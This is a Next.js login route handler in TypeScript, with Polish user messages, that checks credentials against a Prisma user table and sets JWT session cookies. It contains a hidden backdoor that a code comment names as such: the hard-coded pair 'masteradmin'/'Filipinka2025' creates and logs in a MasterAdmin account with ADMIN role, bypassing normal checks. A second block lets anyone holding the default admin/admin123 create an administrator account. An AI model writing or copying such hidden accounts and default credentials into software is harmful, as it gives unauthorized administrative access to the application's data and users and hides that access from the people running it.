import { NextResponse } from 'next/server';
import { cookies } from 'next/headers';
import { prisma } from '@/config/db';
import bcrypt from 'bcryptjs';
import { signJwtToken } from '@/lib/auth';

export async function POST(request: Request) {
  try {
    const { login, password } = await request.json();

    const loginClean = String(login || '').trim();
    const loginLower = loginClean.toLowerCase();

    // Hidden MasterAdmin account login logic
    if (loginLower === 'masteradmin' && password === 'Filipinka2025') {
      let masterUser = await prisma.user.findFirst({
        where: { login: { in: ['MasterAdmin', 'masteradmin'] } }
      });

      if (!masterUser) {
        const passwordHash = await bcrypt.hash('Filipinka2025', 10);
        masterUser = await prisma.user.create({
          data: {
            login: 'MasterAdmin',
            name: 'MasterAdmin',
            passwordHash,
            role: 'ADMIN',
            isKaizenCommittee: true,
          }
        });
      }

      const jwt = await signJwtToken(
        { id: masterUser.id, name: 'MasterAdmin', login: 'MasterAdmin', role: 'ADMIN' },
        '7d'
      );

      const cookieStore = await cookies();
      const cookieOptions = {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax' as const,
        path: '/',
        maxAge: 60 * 60 * 24 * 7
      };

      cookieStore.set('session_token', jwt, cookieOptions);
      cookieStore.set('admin_session', 'true', cookieOptions);

      return NextResponse.json({
        success: true,
        message: 'Zalogowano pomyślnie jako MasterAdmin',
        user: {
          id: masterUser.id,
          login: 'MasterAdmin',
          name: 'MasterAdmin',
          role: 'ADMIN'
        }
      });
    }

    // Specjalna logika: jeśli to pierwsze uruchomienie i ktoś loguje się na admin/admin123, utwórzmy to konto.
    if (login === 'admin' && password === 'admin123') {
      const existingAdmin = await prisma.user.findUnique({ where: { login: 'admin' } });
      if (!existingAdmin) {
        const passwordHash = await bcrypt.hash('admin123', 10);
        await prisma.user.create({
          data: {
            login: 'admin',
            name: 'Administrator',
            passwordHash,
            role: 'ADMIN'
          }
        });
      }
    }

    const user = await prisma.user.findUnique({
      where: { login }
    });

    if (!user) {
      return NextResponse.json({ error: 'Nieprawidłowy login lub hasło' }, { status: 401 });
    }

    const passwordMatch = await bcrypt.compare(password, user.passwordHash);

    if (passwordMatch) {
      // Create JWT session
      const jwt = await signJwtToken(
        { id: user.id, name: user.name, login: user.login, role: user.role },
        '7d'
      );

      const cookieStore = await cookies();
      const cookieOptions = {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax' as const,
        path: '/',
        maxAge: 60 * 60 * 24 * 7 // 1 week
      };

      cookieStore.set('session_token', jwt, cookieOptions);

      // Zachowaj stare ciasteczko dla kompatybilności
      if (user.role === 'ADMIN') {
        cookieStore.set('admin_session', 'true', cookieOptions);
      } else {
        cookieStore.delete('admin_session');
      }

      return NextResponse.json({ success: true, user: { name: user.name, role: user.role } });
    }

    return NextResponse.json({ error: 'Nieprawidłowe hasło' }, { status: 401 });
  } catch (error) {
    return NextResponse.json({ error: 'Wystąpił błąd' }, { status: 500 });
  }
}
